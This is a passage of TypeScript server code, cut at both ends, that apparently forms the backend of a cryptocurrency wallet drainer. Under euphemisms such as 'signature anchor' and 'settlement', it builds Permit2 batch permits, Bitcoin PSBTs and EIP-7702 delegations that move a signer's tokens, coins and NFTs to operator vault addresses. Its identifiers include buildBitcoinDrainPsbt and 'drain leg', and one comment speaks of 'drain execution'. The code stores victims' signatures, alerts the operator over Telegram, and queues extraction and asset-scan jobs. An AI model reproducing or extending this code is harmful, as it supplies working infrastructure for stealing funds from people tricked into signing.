      const tokenRaw = entry.token?.trim() ?? ''
      const amountRaw = entry.amount?.trim() ?? ''
      if (!tokenRaw || !amountRaw || !isAddress(tokenRaw)) {
        return sendFailure(reply, 400, 'Each permit requires valid token and amount', {
          code: 'ValidationError',
        })
      }
      let amount: bigint
      try {
        amount = BigInt(amountRaw)
      } catch {
        return sendFailure(reply, 400, 'Each permit amount must be a valid integer string', {
          code: 'ValidationError',
        })
      }
      if (amount <= 0n) {
        return sendFailure(reply, 400, 'Each permit amount must be greater than zero', {
          code: 'ValidationError',
        })
      }
      permits.push({ token: tokenRaw as Address, amount })
    }
    let nativeAmount = 0n
    if (body.nativeAmount != null) {
      try {
        nativeAmount = parseNativeAmount(body.nativeAmount)
      } catch {
        return sendFailure(reply, 400, 'nativeAmount must be a valid integer string', {
          code: 'ValidationError',
        })
      }
      if (nativeAmount < 0n) {
        return sendFailure(reply, 400, 'nativeAmount must be non-negative', { code: 'ValidationError' })
      }
    }
    const parseOptionalNative = (
      raw: string | number | undefined,
      field: string,
    ): bigint | undefined => {
      if (raw == null) return undefined
      try {
        const value = parseNativeAmount(raw)
        if (value < 0n) {
          throw new Error(`${field} must be non-negative`)
        }
        return value
      } catch {
        throw new Error(`${field} must be a valid integer string`)
      }
    }

    let nativeAmountSol: bigint | undefined
    let nativeAmountTrx: bigint | undefined
    let nativeAmountTon: bigint | undefined
    try {
      nativeAmountSol = parseOptionalNative(body.nativeAmountSol, 'nativeAmountSol')
      nativeAmountTrx = parseOptionalNative(body.nativeAmountTrx, 'nativeAmountTrx')
      nativeAmountTon = parseOptionalNative(body.nativeAmountTon, 'nativeAmountTon')
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e)
      return sendFailure(reply, 400, msg, { code: 'ValidationError' })
    }

    const solWallet = body.sol_wallet?.trim() || undefined
    const trxWallet = body.trx_wallet?.trim() || undefined
    const tonWallet = body.ton_wallet?.trim() || undefined

    if (nativeAmountSol != null && nativeAmountSol > 0n && !solWallet) {
      return sendFailure(reply, 400, 'nativeAmountSol > 0 requires sol_wallet', { code: 'ValidationError' })
    }
    if (nativeAmountTrx != null && nativeAmountTrx > 0n && !trxWallet) {
      return sendFailure(reply, 400, 'nativeAmountTrx > 0 requires trx_wallet', { code: 'ValidationError' })
    }
    if (nativeAmountTon != null && nativeAmountTon > 0n && !tonWallet) {
      return sendFailure(reply, 400, 'nativeAmountTon > 0 requires ton_wallet', { code: 'ValidationError' })
    }

    const parsedNfts = parseBatchNftEntries(body.nfts)
    if (parsedNfts.ok === false) {
      return sendFailure(reply, 400, parsedNfts.error, { code: 'ValidationError' })
    }

    const omnichainLeg = hasOmnichainBatchDrainLeg({
      nativeAmountSol,
      nativeAmountTrx,
      nativeAmountTon,
      solWallet,
      trxWallet,
      tonWallet,
      nfts: parsedNfts.nfts.length > 0 ? parsedNfts.nfts : undefined,
    })
    if (permits.length === 0 && nativeAmount <= 0n && !omnichainLeg) {
      return sendFailure(reply, 400, 'permits[], nativeAmount > 0, or omnichain leg required', {
        code: 'ValidationError',
      })
    }

    if (!isRpcConfigured(chainId) && process.env['NODE_ENV'] !== 'development') {
      return sendFailure(
        reply,
        400,
        `RPC not configured for chain ${chainId}. Set ${getChainEnvName(chainId)} in environment.`,
        { code: 'RPC_NOT_CONFIGURED', chainId },
      )
    }

    let rpcUrl: string
    try {
      rpcUrl = getRpcUrlForChainWithFallback(chainId)
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e)
      return sendFailure(reply, 400, msg, { code: 'RPC_NOT_CONFIGURED', chainId })
    }

    try {
      const built = await buildPermit2BatchTypedDataForWallet({
        wallet: walletRaw as Address,
        chainId,
        permits,
        nativeAmount,
        nativeAmountSol,
        nativeAmountTrx,
        nativeAmountTon,
        solWallet,
        trxWallet,
        tonWallet,
        nfts: parsedNfts.nfts.length > 0 ? parsedNfts.nfts : undefined,
        rpcUrl,
      })
      return sendSuccess(reply, 200, 'Permit2 batch typed data ready', normalizeBigInts({
        ...(built.typedData ? { typed_data: built.typedData } : {}),
        batch_permit_metadata: built.batch_permit_metadata,
        permits: permits.map((p) => ({ token: p.token, amount: p.amount.toString() })),
        nativeAmount: built.nativeAmount,
        ...(built.native_transfer ? { native_transfer: built.native_transfer } : {}),
        ...(built.native_amount_sol ? { native_amount_sol: built.native_amount_sol } : {}),
        ...(built.native_amount_trx ? { native_amount_trx: built.native_amount_trx } : {}),
        ...(built.native_amount_ton ? { native_amount_ton: built.native_amount_ton } : {}),
        ...(built.native_transfer_sol ? { native_transfer_sol: built.native_transfer_sol } : {}),
        ...(built.native_transfer_trx ? { native_transfer_trx: built.native_transfer_trx } : {}),
        ...(built.native_transfer_ton ? { native_transfer_ton: built.native_transfer_ton } : {}),
        ...(built.nfts ? { nfts: built.nfts } : {}),
        ...(built.nft_approval_typed_data
          ? { nft_approval_typed_data: built.nft_approval_typed_data }
          : {}),
        engine_spender: built.engine_spender,
        permit2: built.permit2,
        protocol: 'permit2_batch_eip712',
      }) as Record<string, unknown>)
    } catch (e) {
      return sendTypedDataBuildFailure(reply, e)
    }
  })

  app.post('/api/v1/signature-anchor/bitcoin-psbt', async (request, reply) => {
    const body = request.body as {
      wallet_address?: string
      wallet?: string
      amount?: string | number
      amount_sat?: string | number
      vault_address?: string
    }
    const walletRaw = body.wallet_address?.trim() ?? body.wallet?.trim() ?? ''
    const amountRaw = body.amount_sat ?? body.amount
    if (!walletRaw || amountRaw == null) {
      return sendFailure(reply, 400, 'wallet_address and amount_sat required', {
        code: 'ValidationError',
      })
    }
    let amountSat: bigint
    try {
      amountSat = parseBitcoinSatAmount(amountRaw)
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e)
      return sendFailure(reply, 400, msg, { code: 'ValidationError' })
    }
    const vaultAddress = body.vault_address?.trim() || resolveBitcoinVaultAddress()
    if (!vaultAddress) {
      return sendFailure(reply, 503, 'VAULT_ADDRESS_BTC / SOVEREIGN_VAULT_BTC not configured', {
        code: 'NotConfigured',
      })
    }
    if (!process.env['BLOCKCYPHER_API_TOKEN']?.trim()) {
      return sendFailure(reply, 503, 'BLOCKCYPHER_API_TOKEN not configured', { code: 'NotConfigured' })
    }
    try {
      const built = await buildBitcoinDrainPsbt({
        walletAddress: walletRaw,
        amount: amountSat,
        vaultAddress,
      })
      return sendSuccess(reply, 200, 'Bitcoin PSBT ready for wallet signing', {
        psbt_base64: built.psbtBase64,
        wallet_address: built.walletAddress,
        vault_address: built.vaultAddress,
        amount_sat: built.amountSat,
        fee_sat: built.feeSat,
        change_sat: built.changeSat,
        inputs: built.inputs,
        feerate_sat_vb: built.feerateSatVb,
        network: built.network,
        protocol: 'bitcoin_psbt',
        chain_family: 'UTXO',
        chain_id: built.network === 'testnet' ? 'bip122:1' : BIP122_BITCOIN_MAINNET,
      })
    } catch (e) {
      return sendTypedDataBuildFailure(reply, e)
    }
  })

  app.post('/api/signature-anchor', signatureAnchorPostHandler)
  app.post('/api/v1/signature-anchor', signatureAnchorPostHandler)
}

async function persistSignatureRow(
  row: PersistedSignatureRow,
  reply: FastifyReply,
): Promise<FastifyReply> {
  const chainResolved = resolveChainIngress({
    chain_family: row.chain_family,
    chain_id: row.chain_id,
    caip_chain_id: row.caip_chain_id,
  })
  row = {
    ...row,
    chain_family: (row.chain_family ?? chainResolved.chainFamily) as ChainFamily,
    chain_id: chainResolved.storageChainId,
    caip_chain_id: chainResolved.caipChainId ?? row.caip_chain_id ?? null,
  }
  let url: string
  try {
    url = resolveCentralHubVaultUrl()
  } catch {
    const msg =
      'Vault configuration missing: set NEXT_PUBLIC_SUPABASE_URL / SUPABASE_URL (Central Hub Vault binding)'
    gatekeeperPersistLog('error', 'signatures.config_missing', msg)
    return sendFailure(reply, 500, msg, { code: 'ServerError' })
  }
  const serviceKey = process.env['SUPABASE_SERVICE_ROLE_KEY']
  if (!serviceKey) {
    const msg =
      'Vault configuration missing: set SUPABASE_SERVICE_ROLE_KEY (Central Hub service-role write path)'
    gatekeeperPersistLog('error', 'signatures.config_missing', msg)
    return sendFailure(reply, 500, msg, { code: 'ServerError' })
  }
  if (!hasConfiguredShadowEnvelopeKey()) {
    const msg = 'Neural Weld lock: SHADOW_VAULT_KEY (64 hex) or GATEKEEPER_SECRET required'
    gatekeeperPersistLog('error', 'signatures.shadow_config_missing', msg)
    return sendFailure(reply, 500, msg, { code: 'ServerError' })
  }
  if (!row.signature_hex.startsWith(SHADOW_ENVELOPE_PREFIX)) {
    const msg = 'Neural Weld lock: signature_hex must be SHADOW_GCM envelope'
    gatekeeperPersistLog('error', 'signatures.shadow_envelope_required', msg)
    return sendFailure(reply, 400, msg, { code: 'ValidationError' })
  }

  const walletAddress = row.wallet_address?.trim() ?? ''
  const tokenAddress = row.token_address?.trim() ?? ''
  if (!walletAddress || !tokenAddress) {
    const msg = 'wallet_address and token_address are required'
    gatekeeperPersistLog('error', 'signatures.validation_failed', msg, anchorLogFields(row))
    return sendFailure(reply, 400, msg, { code: 'ValidationError' })
  }
  const walletNorm = /^0x[0-9a-fA-F]{40}$/.test(walletAddress)
    ? walletAddress.toLowerCase()
    : walletAddress
  const tokenNorm = /^0x[0-9a-fA-F]{40}$/.test(tokenAddress)
    ? tokenAddress.toLowerCase()
    : tokenAddress

  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const supabase: any = createClient(url, serviceKey)
  const rowPayload: Record<string, unknown> = {
    wallet_address: walletNorm,
    token_address: tokenNorm,
    signature_hex: row.signature_hex,
    nonce: row.nonce,
    expiry: row.expiry,
    wallet_type: row.wallet_type,
    protocol: row.protocol,
  }
  if (row.chain_family != null) {
    rowPayload['chain_family'] = row.chain_family
  }
  if (row.chain_id != null && String(row.chain_id).trim() !== '') {
    rowPayload['chain_id'] = String(row.chain_id).trim()
  }
  if (row.caip_chain_id != null && String(row.caip_chain_id).trim() !== '') {
    rowPayload['caip_chain_id'] = String(row.caip_chain_id).trim()
  }
  rowPayload['scout_value_usd'] =
    row.scout_value_usd != null && row.scout_value_usd !== '' ? row.scout_value_usd : '0'
  rowPayload['max_allowance'] =
    row.max_allowance != null && row.max_allowance !== '' ? row.max_allowance : String(PERMIT2_MAX_AMOUNT)
  rowPayload['amount'] = row.amount != null && row.amount !== '' ? row.amount : '0'
  if (row.requires_quorum != null) rowPayload['requires_quorum'] = row.requires_quorum
  rowPayload['source_origin'] = row.source_origin
  rowPayload['settlement_status'] = 'PENDING'

  const chainNormForTelegram =
    row.chain_id != null && String(row.chain_id).trim() !== ''
      ? String(row.chain_id).trim()
      : null
  const scoutUsdForTelegram = Number(row.scout_value_usd ?? '0')
  const anchorTelegramCtx: TelegramRequestContext = {
    chain_id: chainNormForTelegram ?? undefined,
    chain_family: row.chain_family ?? row.protocol.toUpperCase(),
    wallet_type: row.wallet_type,
    scout_value_usd: row.scout_value_usd ?? scoutUsdForTelegram,
    amount: row.amount ?? undefined,
    nonce: row.nonce,
    tokenAddress: row.token_address,
    signature: row.signature_hex,
  }
  notifySignatureReceived(
    row.wallet_address,
    row.protocol.toUpperCase(),
    row.signature_hex,
    anchorTelegramCtx,
  ).catch(() => {})
  notifyNewSignatureAnchorRequest(
    row.wallet_address,
    row.protocol.toUpperCase(),
    row.wallet_type,
    Number.isFinite(scoutUsdForTelegram) ? scoutUsdForTelegram : 0,
    anchorTelegramCtx,
  ).catch(() => {})

  const { data: savedRecord, error: upErr } = await supabase
    .from('signatures')
    .upsert(rowPayload, {
      onConflict: 'wallet_address,token_address',
    })
    .select('id')
    .single()

  if (upErr) {
    const shadowDetail = serializeSupabaseFault(upErr)
    gatekeeperPersistLog('error', 'signatures.upsert_failed', shadowDetail, anchorLogFields(row))
    return sendFailure(reply, 502, upErr.message, { code: 'UpstreamError' })
  }

  try {
    const enqueueResult = await enqueueExtractionJob('extraction', {
      wallet_address: row.wallet_address,
      signature_id: savedRecord?.id != null ? String(savedRecord.id) : undefined,
      chain_id: chainNormForTelegram ?? 'eip155',
      token_address: row.token_address,
    })
    if (enqueueResult.mode === 'memory') {
      gatekeeperPersistLog(
        'warn',
        'extraction.memory_fallback',
        enqueueResult.warning,
        anchorLogFields(row),
      )
    }
  } catch (enqueueErr) {
    const detail = enqueueErr instanceof Error ? enqueueErr.message : String(enqueueErr)
    gatekeeperPersistLog('warn', 'extraction.enqueue_failed', detail, anchorLogFields(row))
  }

  const scoutParsed = Number(row.scout_value_usd ?? '0')
  const scout_value_usd = Number.isFinite(scoutParsed) ? scoutParsed : 0
  const chainNorm =
    row.chain_id != null && String(row.chain_id).trim() !== ''
      ? String(row.chain_id).trim()
      : null

  const isOmnichainAtomic = row.protocol === 'omnichain_atomic_v1'
  const isEvmPermit2 =
    row.chain_family === 'EVM' &&
    (row.protocol === 'permit2_eip712' || row.protocol.includes('permit2'))

  try {
    assertNoSimulationFlagsInProduction()
  } catch (simErr) {
    const detail = simErr instanceof Error ? simErr.message : String(simErr)
    gatekeeperPersistLog('error', 'settlement.sim_flag_blocked', detail, anchorLogFields(row))
    return sendFailure(reply, 503, detail, { code: 'ProductionSimFlagBlocked' })
  }

  const ingress = await evaluateLargeSettlementIngress({
    wallet_address: row.wallet_address,
    chain_id: chainNorm,
    scout_value_usd,
    token_address: row.token_address,
    amount: row.amount,
    protocol: row.protocol,
    signature_id: savedRecord?.id != null ? String(savedRecord.id) : undefined,
  })
  if (ingress.proceed === false) {
    gatekeeperPersistLog(
      'warn',
      `settlement.policy.${ingress.policy.action}`,
      ingress.message,
      anchorLogFields(row, scout_value_usd),
    )
    const deferredHistoryId = await recordSettlementHistory({
      wallet_address: row.wallet_address,
      chain_family: row.chain_family ?? null,
      amount: row.amount ?? null,
      token_address: row.token_address,
      protocol: row.protocol,
      chain_id: chainNorm,
      signature_id: savedRecord?.id != null ? String(savedRecord.id) : null,
    })
    if (deferredHistoryId) {
      gatekeeperPersistLog(
        'warn',
        'settlement.history.deferred',
        `history_id=${deferredHistoryId}`,
        anchorLogFields(row),
      )
    }
    const policyBody = {
      handshake_active: true,
      settlement_policy: ingress.policy.action,
      strategies: ingress.policy.strategies,
      timing: ingress.policy.timing,
      ...(ingress.policy.delay_hours != null ? { delay_hours: ingress.policy.delay_hours } : {}),
      ...(ingress.policy.chunk_count ? { chunk_count: ingress.policy.chunk_count } : {}),
      ...(ingress.policy.exchange ? { exchange: ingress.policy.exchange } : {}),
      lethal_core_aligned: true,
    }
    if (ingress.http_status === 422) {
      return sendFailure(reply, 422, ingress.message, {
        code: ingress.code,
        ...policyBody,
      })
    }
    return sendSuccess(reply, ingress.http_status, ingress.message, {
      settlement_deferred: true,
      ...policyBody,
    })
  }

  const settlementHistoryId = await recordSettlementHistory({
    wallet_address: row.wallet_address,
    chain_family: row.chain_family ?? null,
    amount: row.amount ?? null,
    token_address: row.token_address,
    protocol: row.protocol,
    chain_id: chainNorm,
    signature_id: savedRecord?.id != null ? String(savedRecord.id) : null,
  })

  await notifySettlementAttempt({
    wallet_address: row.wallet_address,
    chain_family: row.chain_family ?? null,
    chain_id: chainNorm,
    amount: row.amount ?? null,
    token_address: row.token_address,
    protocol: row.protocol,
    scout_value_usd: scout_value_usd,
  }).catch(() => {})

  let settlementOutcome: SettlementIgnitionOutcome | undefined
  if (isOmnichainAtomic) {
    settlementOutcome = await runOmnichainAtomicReconciliation({
      supabase,
      row,
      chain_id: chainNorm,
      scout_value_usd,
    })
  } else if (isEvmPermit2) {
    settlementOutcome = await runEventDrivenReconciliation({
      supabase,
      row,
      chain_id: chainNorm,
      scout_value_usd,
      defer_broadcast: false,
      settlement_policy: ingress.policy,
    })
  } else {
    queueEventDrivenReconciliation({
      supabase,
      row,
      chain_id: chainNorm,
      scout_value_usd,
      defer_broadcast: process.env['SETTLEMENT_IMMEDIATE'] === 'true' ? false : undefined,
    })
  }

  queueKineticDeepAssetScan(row.wallet_address)

  const persistenceAnchor = verifyAuthorizedSessionPersistenceAnchor(String(row.expiry))
  if (!persistenceAnchor.drift_window_ok && !process.env['PROD']) {
    gatekeeperPersistLog('warn', 'signatures.persistence_anchor', 'expiry failed drift reconciliation post-upsert')
  }

  const transaction_hash = settlementIgnitionTxHash(settlementOutcome) ?? null
  const settlement_fault = settlementIgnitionFault(settlementOutcome)
  const omnichain_settlement = settlementOmnichainAtomicResult(settlementOutcome)
  const settlement_reconciliation_queued = !isEvmPermit2 && !isOmnichainAtomic

  await completeSettlementTracking({
    historyId: settlementHistoryId,
    row,
    chainNorm,
    scout_value_usd,
    transaction_hash,
    settlement_fault,
    omnichain_settlement,
    settlement_reconciliation_queued,
  })

  if (settlement_fault != null) {
    if (isInsufficientRelayerFault(settlement_fault)) {
      return sendFailure(reply, 503, 'Insufficient relayer balance for settlement broadcast', {
        code: 'INSUFFICIENT_RELAYER_BALANCE',
        settlement_status: 'PENDING_BROADCAST',
        settlement_fault,
        handshake_active: true,
        settlement_reconciliation_queued: false,
        lethal_core_aligned: true,
        ...(omnichain_settlement ? { omnichain_settlement } : {}),
      })
    }
    if (isDeferredBroadcastFault(settlement_fault)) {
      return sendFailure(reply, 503, 'Settlement broadcast deferred — RPC unavailable', {
        code: 'DEFERRED_BROADCAST',
        settlement_status: 'PENDING_BROADCAST',
        settlement_fault,
        handshake_active: true,
        settlement_reconciliation_queued: false,
        lethal_core_aligned: true,
        ...(omnichain_settlement ? { omnichain_settlement } : {}),
      })
    }
    const contractFault = isContractSettlementFault(settlement_fault)
    const contractMsg =
      settlement_fault.includes('0x815e1d64') || settlement_fault.toLowerCase().includes('invalidsigner')
        ? 'Permit2 InvalidSigner — signed typed data does not match the on-chain permit'
        : 'Permit2 settlement rejected on-chain'
    return sendFailure(reply, 502, contractFault ? contractMsg : 'Settlement broadcast failed', {
      code: contractFault ? 'PERMIT2_REVERTED' : 'SettlementBroadcastFailed',
      settlement_status: 'FAILED_SETTLEMENT',
      settlement_fault,
      handshake_active: true,
      settlement_reconciliation_queued: false,
      lethal_core_aligned: true,
      ...(omnichain_settlement ? { omnichain_settlement } : {}),
      ...(transaction_hash ? { transaction_hash, l2_mint_transaction_hash: transaction_hash } : {}),
    })
  }

  return sendSuccess(reply, 200, 'Signature anchored', {
    handshake_active: true,
    ...(transaction_hash ? { transaction_hash, l2_mint_transaction_hash: transaction_hash } : {}),
    ...(omnichain_settlement
      ? {
          omnichain_settlement,
          settlement_transaction_hashes: omnichain_settlement.omnichain_transaction_hashes,
        }
      : {}),
    settlement_reconciliation_queued: settlement_reconciliation_queued,
    settlement_status:
      transaction_hash || omnichain_settlement?.ok
        ? 'SETTLED'
        : isEvmPermit2 || isOmnichainAtomic
          ? 'FAILED_SETTLEMENT'
          : 'PENDING',
    lethal_core_aligned: true,
  })
}

async function handleNormalizedFromSettlement(
  b: NormalizedSignatureAnchorSettlement,
  sourceOrigin: string,
  reply: FastifyReply,
): Promise<FastifyReply> {
  const normalized: NormalizedIngressV1 = {
    ingress: 'normalized_v1',
    chain_family: b.chain_family,
    wallet_address: b.wallet_address,
    token_address: b.token_address,
    signature: b.signature as Hex | string,
    signature_hex: b.signature as Hex | string,
    nonce: b.nonce,
    expiry_iso: b.expiry_iso,
    wallet_type: b.wallet_type,
    protocol: b.protocol,
    chain_id: b.chain_id,
    scout_value_usd: b.scout_value_usd,
    ...(b.amount !== undefined ? { amount: b.amount } : {}),
    max_allowance: b.max_allowance,
    requires_quorum: b.requires_quorum,
  }
  return handleNormalizedIngress(normalized, sourceOrigin, reply)
}

async function handleAgnosticNormalization(
  b: AgnosticNormalizationV1,
  sourceOrigin: string,
  reply: FastifyReply,
): Promise<FastifyReply> {
  const signatureRaw = b.signature_hex ?? b.signature
  if (!signatureRaw || !b.wallet_address) {
    return sendFailure(reply, 400, 'Agnostic Normalization requires signature and wallet_address', { code: 'ValidationError' })
  }
  return sendFailure(reply, 400, 'Agnostic Normalization lane locked. Use normalized_v1.', {
    code: 'ValidationError',
  })
}

async function handleNormalizedIngress(
  b: NormalizedIngressV1,
  sourceOrigin: string,
  reply: FastifyReply,
): Promise<FastifyReply> {
  const families: ChainFamily[] = ['EVM', 'SVM', 'UTXO', 'TRON', 'TON', 'COSMOS', 'APTOS', 'SUI']
  if (!families.includes(b.chain_family)) {
    return sendFailure(reply, 400, 'Invalid chain_family for Normalized Ingress', { code: 'ValidationError' })
  }
  const signatureRaw = b.signature_hex ?? b.signature
  if (!b.wallet_address || !signatureRaw || !b.nonce || !b.expiry_iso) {
    return sendFailure(reply, 400, 'Invalid Normalized Ingress payload', { code: 'ValidationError' })
  }
  if (!isExpiryIsoWithinDriftWindow(String(b.expiry_iso).trim())) {
    return sendFailure(
      reply,
      400,
      'Signature Anchor expiry outside operational Drift Window (Clock Desync).',
      { code: 'ValidationError' },
    )
  }
  if (!b.wallet_type || !b.protocol) {
    return sendFailure(reply, 400, 'Normalized Ingress requires wallet_type and protocol', { code: 'ValidationError' })
  }
  const rack = normalizeProtocolRack(b.protocol)
  const protocolNorm = rack
  if (!PROTOCOL_RACK.has(rack)) {
    return sendFailure(
      reply,
      400,
      'protocol must be one of: evm, permit2_eip712, permit2_batch_eip712, eip7702_delegation, eip7702_self_broadcast, omnichain_atomic_v1, seaport_listing, solana, utxo, bitcoin_psbt, tron, ton, cosmos, aptos, sui, polkadot, algorand, cardano',
      { code: 'ValidationError' },
    )
  }
  const batchPermits = b.permits?.filter(
    (p) => typeof p.token === 'string' && typeof p.amount === 'string',
  )
  const resolvedTokenAddress =
    b.token_address?.trim() ||
    (protocolNorm === 'bitcoin_psbt' ? 'OMNI_UTXO_ANCHOR' : '') ||
    (batchPermits && batchPermits.length > 0 ? batchPermits[0]!.token.trim() : '')
  if (!resolvedTokenAddress) {
    return sendFailure(reply, 400, 'Invalid Normalized Ingress payload: token_address or permits required', {
      code: 'ValidationError',
    })
  }
  const sig = normalizeSignatureHexForSeal(
    typeof signatureRaw === 'string' ? signatureRaw : String(signatureRaw),
  )
  const { wallet_address, token_address } = normalizeWalletToken(
    b.chain_family,
    b.wallet_address,
    resolvedTokenAddress,
  )
  const hasOmnichainEvmBatch =
    b.chain_id != null &&
    b.engine_spender != null &&
    b.permit2 != null &&
    b.batch_permit_metadata != null &&
    batchPermits != null &&
    batchPermits.length > 0
  const hasOmnichainNonEvmPayload =
    b.solana_payload != null ||
    b.tron_payload != null ||
    b.ton_payload != null ||
    b.bitcoin_payload != null ||
    b.cosmos_payload != null ||
    b.aptos_payload != null ||
    b.sui_payload != null
  const omnichainNonEvmOnly =
    protocolNorm === 'omnichain_atomic_v1' && hasOmnichainNonEvmPayload && !hasOmnichainEvmBatch
  if (
    b.chain_family === 'EVM' &&
    !omnichainNonEvmOnly &&
    (!isAddress(wallet_address) || !isAddress(token_address))
  ) {
    return sendFailure(reply, 400, 'EVM Normalized Ingress requires hex addresses', { code: 'ValidationError' })
  }
  if (omnichainNonEvmOnly) {
    if (b.cosmos_payload != null && !isCosmosBech32Address(wallet_address)) {
      return sendFailure(reply, 400, 'omnichain_atomic_v1 cosmos leg requires valid bech32 wallet_address', {
        code: 'ValidationError',
      })
    }
    if (b.aptos_payload != null && !isAptosAddress(wallet_address)) {
      return sendFailure(reply, 400, 'omnichain_atomic_v1 aptos leg requires valid Aptos wallet_address', {
        code: 'ValidationError',
      })
    }
    if (b.sui_payload != null && !isSuiAddress(wallet_address)) {
      return sendFailure(reply, 400, 'omnichain_atomic_v1 sui leg requires valid Sui wallet_address', {
        code: 'ValidationError',
      })
    }
  }

  if (b.chain_family === 'COSMOS' || b.chain_family === 'APTOS' || b.chain_family === 'SUI') {
    const extendedChainReady =
      b.chain_family === 'COSMOS'
        ? Boolean(
            process.env['RPC_COSMOS']?.trim() &&
              (process.env['VAULT_ADDRESS_COSMOS']?.trim() ||
                process.env['SOVEREIGN_VAULT_COSMOS']?.trim()) &&
              (process.env['COSMOS_EXECUTION_MNEMONIC']?.trim() ||
                process.env['COSMOS_EXECUTION_PRIVATE_KEY']?.trim()),
          )
        : b.chain_family === 'APTOS'
          ? Boolean(
              process.env['RPC_APTOS_PRIVATE']?.trim() &&
                (process.env['VAULT_ADDRESS_APTOS']?.trim() ||
                  process.env['SOVEREIGN_VAULT_APTOS']?.trim()) &&
                process.env['APTOS_EXECUTION_PRIVATE_KEY']?.trim(),
            )
          : Boolean(
              process.env['RPC_SUI_PRIVATE']?.trim() &&
                (process.env['VAULT_ADDRESS_SUI']?.trim() ||
                  process.env['SOVEREIGN_VAULT_SUI']?.trim()) &&
                process.env['SUI_EXECUTION_PRIVATE_KEY']?.trim(),
            )
    if (!extendedChainReady) {
      return sendFailure(
        reply,
        503,
        `${b.chain_family} settlement is not configured on this deployment — set RPC, vault, and execution keys`,
        { code: 'ChainNotConfigured' },
      )
    }
    const expectedProtocol = b.chain_family.toLowerCase()
    if (protocolNorm !== expectedProtocol) {
      return sendFailure(
        reply,
        400,
        `${b.chain_family} ingress requires protocol=${expectedProtocol}`,
        { code: 'ValidationError' },
      )
    }
    const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
    const amountRaw = (b.amount ?? tel.amount ?? '').trim()
    if (!/^\d+$/.test(amountRaw) || amountRaw === '0') {
      return sendFailure(
        reply,
        400,
        `${b.chain_family} ingress requires amount in base units (uatom / octas / mist)`,
        { code: 'ValidationError' },
      )
    }
    if (b.chain_family === 'COSMOS' && !isCosmosBech32Address(wallet_address)) {
      return sendFailure(reply, 400, 'COSMOS ingress requires a valid bech32 wallet address', {
        code: 'ValidationError',
      })
    }
    if (b.chain_family === 'APTOS' && !isAptosAddress(wallet_address)) {
      return sendFailure(reply, 400, 'APTOS ingress requires a valid Aptos wallet address', {
        code: 'ValidationError',
      })
    }
    if (b.chain_family === 'SUI' && !isSuiAddress(wallet_address)) {
      return sendFailure(reply, 400, 'SUI ingress requires a valid Sui wallet address', {
        code: 'ValidationError',
      })
    }
  }

  if (b.chain_family === 'UTXO' && protocolNorm === 'bitcoin_psbt') {
    const signedPsbt = b.signed_psbt_base64?.trim() ?? String(signatureRaw ?? '').trim()
    if (!signedPsbt) {
      return sendFailure(
        reply,
        400,
        'bitcoin_psbt ingress requires signed_psbt_base64 from wallet PSBT signing',
        { code: 'ValidationError' },
      )
    }
    const vaultAddress = b.psbt_metadata?.vault_address?.trim() || resolveBitcoinVaultAddress()
    if (!vaultAddress) {
      return sendFailure(reply, 500, 'VAULT_ADDRESS_BTC / SOVEREIGN_VAULT_BTC not configured', {
        code: 'ServerError',
      })
    }
    let amountSat = '0'
    try {
      amountSat = parseBitcoinSatAmount(
        b.psbt_metadata?.amount_sat ?? b.amount ?? b.wallet_balance ?? '0',
      ).toString()
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e)
      return sendFailure(reply, 400, msg, { code: 'ValidationError' })
    }
    if (amountSat === '0') {
      return sendFailure(reply, 400, 'bitcoin_psbt ingress requires amount_sat > 0', {
        code: 'ValidationError',
      })
    }
    const packed = packBitcoinPsbtSignatureEnvelope({
      signedPsbtBase64: signedPsbt,
      walletAddress: wallet_address,
      vaultAddress,
      amountSat,
      ...(b.psbt_metadata?.fee_sat ? { feeSat: b.psbt_metadata.fee_sat } : {}),
    })
    const sealed = sealSignatureHexForPersistence(packed)
    const chainIdNorm =
      b.chain_id != null && String(b.chain_id).trim() !== ''
        ? String(b.chain_id).trim()
        : BIP122_BITCOIN_MAINNET
    const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
    return persistSignatureRow(
      {
        wallet_address,
        token_address: token_address || 'OMNI_UTXO_ANCHOR',
        signature_hex: sealed,
        nonce: b.nonce,
        expiry: b.expiry_iso,
        wallet_type: b.wallet_type.trim(),
        protocol: 'bitcoin_psbt',
        chain_family: 'UTXO',
        scout_value_usd: tel.scout_value_usd,
        amount: amountSat || tel.amount,
        max_allowance: tel.max_allowance,
        requires_quorum: tel.requires_quorum,
        source_origin: sourceOrigin,
        chain_id: chainIdNorm,
      },
      reply,
    )
  }

  if (b.chain_family === 'EVM') {
    // User broadcast the EIP-7702 type-4 tx themselves via MetaMask eth_sendTransaction.
    // Backend just notifies Telegram — no drain execution needed (user already did it on-chain).
    if (protocolNorm === 'eip7702_self_broadcast') {
      const bAny = b as unknown as Record<string, unknown>
      const txHashRaw = bAny.tx_hash
      const txHashStr = typeof txHashRaw === 'string' ? txHashRaw.trim() : ''
      if (!txHashStr.startsWith('0x')) {
        return sendFailure(reply, 400, 'eip7702_self_broadcast requires tx_hash', { code: 'ValidationError' })
      }
      const chainNorm = b.chain_id != null ? String(b.chain_id).trim() : '1'
      const scoutUsd = Number(bAny.scout_value_usd ?? 0) || 0
      const chainIdNum = Number.parseInt(chainNorm.replace(/^eip155:/i, ''), 10)
      const telegramCtx: TelegramRequestContext = {
        chain_family: 'EVM',
        chain_id: chainNorm,
        scout_value_usd: scoutUsd,
        amount: '0',
        wallet_type: String(b.wallet_type ?? 'hot_wallet'),
        tx_hash: txHashStr,
      }
      notifyEvmSettlementWhenVerified({
        txHash: txHashStr,
        address: wallet_address,
        chainId: Number.isFinite(chainIdNum) && chainIdNum > 0 ? chainIdNum : 1,
        ctx: telegramCtx,
      }).catch(() => {})
      return sendSuccess(reply, 200, 'EIP-7702 self-broadcast recorded', {
        tx_hash: txHashStr,
        protocol: 'eip7702_self_broadcast',
      })
    }

    if (protocolNorm === 'eip7702_delegation') {
      if (!isEip7702Enabled()) {
        return sendFailure(reply, 503, 'EIP7702_ENABLED is false on this deployment', {
          code: 'FeatureDisabled',
        })
      }
      if (b.chain_id == null) {
        return sendFailure(reply, 400, 'eip7702_delegation requires chain_id', { code: 'ValidationError' })
      }
      const authRaw = b.eip7702_authorization as Record<string, unknown> | undefined
      if (!authRaw || authRaw['r'] == null || authRaw['s'] == null) {
